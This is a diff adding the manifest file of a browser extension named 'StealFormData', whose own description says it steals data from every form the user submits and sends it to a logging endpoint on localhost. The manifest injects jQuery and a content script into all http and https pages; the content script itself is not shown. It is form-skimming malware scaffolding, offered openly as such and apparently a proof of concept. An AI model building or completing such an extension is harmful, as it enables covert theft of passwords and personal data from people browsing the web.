@@ -1,0 +1,14 @@
+{
+    "manifest_version": 2,
+
+    "name": "StealFormData",
+    "description": "Extension that steals the data from any form the user submits. Does not need any permissions. Sends data to http://localhost:3000/log/",
+    "version": "1.0",
+
+	"content_scripts" : [
+		{
+			"matches": [ "http://*/*", "https://*/*" ],
+			"js" : ["jquery.js", "content.js"],
+		}
+	]
+}
